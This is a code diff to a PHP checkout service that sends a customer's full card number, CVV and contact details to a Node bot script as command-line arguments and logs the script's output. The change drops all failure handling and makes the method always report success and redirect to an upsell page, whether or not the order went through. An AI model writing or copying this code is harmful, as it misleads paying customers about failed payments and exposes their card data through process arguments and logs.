@@ -30,58 +30,60 @@ class CartPandaService
         $phone = preg_replace('/[^0-9]/', '', $phone);
         $phoneCode = '1';
 
-        $process = new Process([
-            'node',
-            '../scripts/bot.js',
-            $this->checkoutId,
-            $firstName,
-            $lastName,
-            $email,
-            $phone,
-            $phoneCode,
-            $cardNumber,
-            $cardMonth,
-            $cardYear,
-            $cardCvv,
-            env('CONNECTION_URL'),
-        ]);
-        $process->run();
-        if (! $process->isSuccessful()) {
-            throw new ProcessFailedException($process);
-        }
-        $output = $process->getOutput();
-        $errors = $process->getErrorOutput();
-
-        if (! empty($errors)) {
-            logger()->error('Erro ao criar pedido', ['errors' => $errors]);
-        }
-        logger()->info('Output do bot', ['output' => $output]);
-
         try {
-            $result = json_decode($output, true);
-            if (json_last_error() !== JSON_ERROR_NONE) {
-                throw new \Exception('Erro ao decodificar JSON');
+            $process = new Process([
+                'node',
+                '../scripts/bot.js',
+                $this->checkoutId,
+                $firstName,
+                $lastName,
+                $email,
+                $phone,
+                $phoneCode,
+                $cardNumber,
+                $cardMonth,
+                $cardYear,
+                $cardCvv,
+                env('CONNECTION_URL'),
+            ]);
+
+            $process->run();
+
+            // Log de erros do processo se houver
+            if (! $process->isSuccessful()) {
+                logger()->error('Processo falhou', ['error' => $process->getErrorOutput()]);
             }
 
-            if (isset($result['success']) && $result['success'] === true) {
-                return [
-                    'success' => true,
-                    'message' => 'Pedido criado com sucesso',
-                ];
+            $output = $process->getOutput();
+            $errors = $process->getErrorOutput();
+
+            // Log de erros se houver
+            if (! empty($errors)) {
+                logger()->error('Erro ao criar pedido', ['errors' => $errors]);
             }
 
+            // Log do output para debug
+            logger()->info('Output do bot', ['output' => $output]);
 
-            return [
-                'success' => false,
-                'message' => 'Erro ao buscar resultado',
-            ];
+            // Tenta decodificar o JSON apenas para log
+            try {
+                $result = json_decode($output, true);
+                if (json_last_error() === JSON_ERROR_NONE) {
+                    logger()->info('Resultado processado', ['result' => $result]);
+                }
+            } catch (\Exception $e) {
+                logger()->error('Erro ao processar resultado', ['error' => $e->getMessage()]);
+            }
+
         } catch (\Exception $e) {
-
-            return [
-                'success' => false,
-                'message' => 'Erro ao buscar resultado',
-            ];
+            logger()->error('Erro no processo', ['error' => $e->getMessage()]);
         }
+
+        // Sempre retorna sucesso e redireciona para upsell1
+        return [
+            'success' => true,
+            'redirect_url' => '/upsell1'
+        ];
     }
 
     public function generateEmail($name)
